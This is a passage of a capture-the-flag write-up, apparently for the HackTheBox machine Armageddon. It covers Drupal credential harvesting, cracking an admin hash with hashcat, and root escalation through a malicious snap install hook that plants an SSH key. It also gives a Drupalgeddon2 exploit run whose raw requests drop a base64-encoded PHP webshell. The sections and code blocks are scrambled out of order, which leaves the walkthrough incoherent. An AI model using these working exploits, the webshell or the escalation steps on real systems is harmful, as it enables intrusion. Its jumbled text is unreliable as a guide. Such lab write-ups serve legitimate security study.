brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

### Drupal Config

apache doesn’t have access to much, so back into the web directory. There’s a `settings.php` file in `/var/www/html/sites/default`. It’s got DB creds:

```php
$databases = array (
'default' =>
	array (
	'default' =>
		array (
		'database' => 'drupal',
		'username' => 'drupaluser',
		'password' => 'CQHEy@9M*m23gBVj',
		'host' => 'localhost',
		'port' => '',
		'driver' => 'mysql',
		'prefix' => '',
		),
	),
);*
```

Everything else looks default.

### Database

Because my shell is a not in a `PTY`, I’ll have to run DB commands from the command line. Drupal creates a bunch of tables:

```php
*bash-4.2$ mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
Tables_in_drupal
actions
authmap
batch
block
...[snip]...
users
users_roles
variable
watchdog
```

```bash
bash-4.2$ mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0       NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt [admin@armageddon.eu](mailto:admin@armageddon.eu)                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London              0       [admin@armageddon.eu](mailto:admin@armageddon.eu)     a:1:{s:7:"overlay";i:1;}*
```

I’m immediately interested in users.

There’s a hash for `brucetherealadmin`.

## `Hashcat`

That hash matches the format for Drupal 7 on the example hashes page. `Hashcat` will crack it pretty quickly with `hashcat -m 7900 brucetherealadmin-hash /usr/share/wordlists/rockyou.txt` to find the password `“booboo”`.

### SSH

This password works for SSH access:

```bash
	oxdf@parrot$ sshpass -p booboo ssh brucetherealadmin@10.129.48.89
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.7
[brucetherealadmin@armageddon ~]$
```

And I can grab `user.txt`:

```bash
[brucetherealadmin@armageddon ~]$ cat user.txt
be57c4e6************************
```

## Shell as `root`

### Enumeration

`brucetherealadmin` can run `snap` installs as `root`:

```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
```

```php
(root) NOPASSWD: /usr/bin/snap install *
User brucetherealadmin may run the following commands on armageddon:
```

### Malicious Snap Package

Googling for malicious `snap` packages led me to an article from 2019 about Dirty Sock. This isn’t the vulnerability here, but they used a malicious `snap` package to exploit the Dirty Sock exploit, and I remember playing with Dirty Sock on HTB and writing this post about it.

There’s a section in the Dirty Sock post that walks through how to create a `snap` package:
I worked from an Ubuntu VM to make the snap, and just followed the instructions. Installed the tools:

```bash
sudo snap install --classic snapcraft
```

```bash
df@buntu:~$ cd /tmp/
df@buntu:/tmp$ mkdir dirty_snap
df@buntu:/tmp$ cd dirty_snap/
df@buntu:/tmp/dirty_snap$ snapcraft init
Created snap/snapcraft.yaml.

Go to [https://docs.snapcraft.io/the-snapcraft-format/8337](https://docs.snapcraft.io/the-snapcraft-format/8337) for more information about the snapcraft.yaml format.
```

```bash
oxdf@parrot$ mkdir snap/hooks
oxdf@parrot$ touch snap/hooks/install
oxdf@parrot$ chmod a+x snap/hooks/install
```

```bash
df@buntu:/tmp/dirty_snap$ cat > snap/hooks/install << "EOF"
#!/bin/bash

mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys
EOF
```

```bash
df@buntu:/tmp/dirty_snap$ cat > snap/snapcraft.yaml << "EOF"
name: armageddon
version: '0.1'
summary: Empty snap, used for exploit
description: |
pwn armageddon

grade: devel
confinement: devmode

parts:
my-part:
plugin: nil
EOF
```

```bash
df@buntu:/tmp/dirty_snap$ snapcraft
Pulling my-part
Building my-part
Staging my-part
Priming my-part
Snapping 'armageddon' |
Snapped armageddon_0.1_amd64.snap
```

```bash
df@buntu:/tmp/dirty_snap$ ls *.snap
armageddon_0.1_amd64.snap*
```

Now I’ll find a directory to work out of, and run `snapcraft init`. It creates a snap directory with `snapcraft.yaml` in it:

I’ll prep the install hook:

The next step in the example they save to install a Bash script that creates a user and adds it to the `sudoers` group. I’ll have mine just write a public SSH key into the root `authorized_keys` file:
The next file, `snapcraft.yaml`, is just boilerplate. I’ll just use the example:

Now on running `snapcraft`, it creates the package:

This `snapcraft` project does not specify the base keyword, explicitly setting the base keyword enables the latest `snapcraft` features.

This project is best built on 'Ubuntu 16.04', but is building on a 'Ubuntu 20.04' host.
Read more about bases at [https://docs.snapcraft.io/t/base-snaps/11198](https://docs.snapcraft.io/t/base-snaps/11198)

```bash
*oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ([http://0.0.0.0:80/](http://0.0.0.0/)) ...*
```

```bash
*[brucetherealadmin@armageddon shm]$ curl 10.10.14.7/armageddon_0.1_amd64.snap -o armageddon_0.1_amd64.snap
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 4096 100 4096 0 0 21478 0 --:--:-- --:--:-- --:--:-- 21671*
```

```bash
*[brucetherealadmin@armageddon shm]$ sudo snap install armageddon_0.1_amd64.snap
error: cannot find signatures with metadata for snap "armageddon_0.1_amd64.snap"*
```

```bash
*[brucetherealadmin@armageddon shm]$ sudo snap install --devmode armageddon_0.1_amd64.snap
armageddon 0.1 installed*
```

```bash
*oxdf@parrot$ ssh -i ~/keys/ed25519_gen [root@10.10.10.233](mailto:root@10.10.10.233)
Last login: Fri Mar 19 07:56:39 2021
[root@armageddon ~]#*
```

```bash
oxdf@parrot$ /opt/Drupalgeddon2/drupalgeddon2.rb [http://127.0.0.1:8888](http://127.0.0.1:8888/)
[*] --==[::#Drupalggedon2::]==--
[i] Target : [http://127.0.0.1:8888/](http://127.0.0.1:8888/)
[+] Found : [http://127.0.0.1:8888/CHANGELOG.txt](http://127.0.0.1:8888/CHANGELOG.txt)

(HTTP Response: 200)

[+] Drupal!: v7.56
[*] Testing: Form   (user/password)
[+] Result : Form valid
[*] Testing: Clean URLs

[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x

[*] Testing: Code Execution (Method: name)
[i] Payload: echo TRZZJAMZ
[+] Result : TRZZJAMZ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!

[*] Testing: Existing file   ([http://127.0.0.1:8888/shell.php](http://127.0.0.1:8888/shell.php))
[i] Response: HTTP 404 // Size: 5
[*] Testing: Writing To Web Root (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
[i] Fake PHP shell:   curl '[http://127.0.0.1:8888/shell.php](http://127.0.0.1:8888/shell.php)' -d 'c=hostname'
armageddon.htb>>
```

### Transfer to Armageddon

I’ll start a Python HTTP server in the directory on my local box where the snap package is:
Now from Armageddon, I’ll request it. wget isn’t installed, but `curl` is:

### Install Snap

To install the package, I’ll run the command with sudo and pass it the snap. 

It fails:

Some Googling this error suggested adding `--dangerous`, which now gives a different error:
Googling that leads to posts about `--devmode`, which works:

### SSH

If that install worked as I hope, my public key is now in `/root/.ssh/authorized_keys`, and I should be able to connect with SSH. It worked:

```bash
*[brucetherealadmin@armageddon shm]$ sudo snap install --dangerous armageddon_0.1_amd64.snap
error: snap "armageddon_0.1_amd64.snap" requires devmode or confinement override*
```

**To take a look at that Ruby script, I set a new listener in Burp that would listen on port 8888 and forward all traffic to 10.10.10.233 port 80:
Then I ran the exploit targeting [http://127.0.0.1:8888](http://127.0.0.1:8888/):

And I can get the root flag:

There are eight new requests in Burp:
The first thing it does is pull the `CHANGELOG.txt`, just like I did above. Then it tries a couple paths to this `/user/password` form, and gets 500 and 404. It goes back to the one that gave 500, and adds additional parameters:

```bash
*[root@armageddon ~]# cat root.txt
a289b09c***********************
```

The `name[%23markup]` field is set to a command. I’m not going to dive too much deeper into the details of why this executes - This post from Checkpoint does a really nice job going into the details. But to see what the script does, it first sends the request above with the final bit being `echo VQMJGJAU`. 

This is just to verify that the exploit works. Then it tries to talk to the backdoor (presumably to see if it’s already uploaded). When that fails (404), it sends the next request:

This time the command is:

The base64 string is pipped into base64 to decode it and then tee will output it to the paste and write it to shell.php.

The command decodes to a PHP webshell:
Now there’s a request to shell.php which is successful (running the hostname command to set up the prompt), and now it’s left to the user to issue additional commands.

```bash
POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20VQMJGJAU HTTP/1.1
User-Agent: drupalgeddon2
Connection: close
Host: 127.0.0.1:8888
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
form_id=user_pass&_triggering_element_name=name
```

```bash
POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20|%20base64%20-d%20|%20tee%20shell.php HTTP/1.1

User-Agent: drupalgeddon2
Connection: close
Host: 127.0.0.1:8888
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
form_id=user_pass&_triggering_element_name=name
```

```bash
echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
```

```php
<?php if( isset( $_REQUEST['c'] ) ) { system( $*REQUEST['c'] . ' 2>&1' ); }*
```